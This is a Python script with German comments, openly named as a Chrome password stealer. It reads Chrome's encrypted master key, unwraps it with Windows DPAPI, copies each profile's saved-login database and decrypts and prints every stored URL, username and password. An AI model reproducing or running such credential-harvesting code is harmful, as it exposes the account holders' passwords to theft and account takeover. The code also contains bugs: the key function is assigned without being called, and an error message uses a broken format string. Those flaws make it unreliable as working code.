from msilib.schema import File
import os
from email.message import EmailMessage
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

def Chromepasswordstealing():
    Chrome_Path_Local = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    Chrome_Path = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_key():
        try:
            # (1) Holen Sie den geheimen Schlüssel aus dem lokalen Chrome-Status.
            with open(Chrome_Path_Local, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(
                local_state["os_crypt"]["encrypted_key"])
            # Suffix DPAPI entfernen
            key = key[5:]
            key = win32crypt.CryptUnprotectData(
                key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, key):
        try:
            # (3-a) Initialisierungsvektor für die AES-Entschlüsselung
            initialisation_vector = ciphertext[3:15]
            # (3-b) Ermitteln des verschlüsselten Passworts durch Entfernen der Suffix-Bytes (letzte 16 Bits)
            # Verschlüsseltes Passwort ist 192 Bits
            encrypted_password = ciphertext[15:-16]
            # (4) Erstellen Sie die Chiffre zur Entschlüsselung des Chiffretextes.
            cipher = generate_cipher(key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print(
                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(Chrome_Path_login_db):
        try:
            print(Chrome_Path_login_db)
            shutil.copy2(Chrome_Path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    try:
        # Dataframe zum Speichern von Passwörtern erstellen
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            # (1) Get secret key
            key = get_key
            # Benutzerprofil oder Standardordner durchsuchen (dort ist das verschlüsselte Anmeldekennwort gespeichert)
            folders = [element for element in os.listdir(
                Chrome_Path) if re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                # (2) Abrufen des Chiffriertextes aus der Sqlite-Datenbank
                Chrome_Path_login_db = os.path.normpath(
                    r"%s\%s\Login Data" % (Chrome_Path, folder))
                conn = get_db_connection(Chrome_Path_login_db)
                if(key and conn):
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url != "" and username != "" and ciphertext != ""):
                            # (3) Filterung des Initialisierungsvektors und des verschlüsselten Passworts aus dem Chiffretext.
                            # (4) Entschlüsseln des Passworts mit dem AES-Algorithmus
                            decrypted_password = decrypt_password(
                                ciphertext, key)
                            print("Sequence: %d" % (index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n" %
                                  (url, username, decrypted_password))
                            print("*"*50)
                            # (5) Speichern in CSV
                            # => Will doch nicht das es gespeichert wird
                            # csv_writer.writerow([index,url,username,decrypted_password])
                    # Datenbankverbindung schließen
                    cursor.close()
                    conn.close()
                    # temp login db löschen
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] " % str(e))
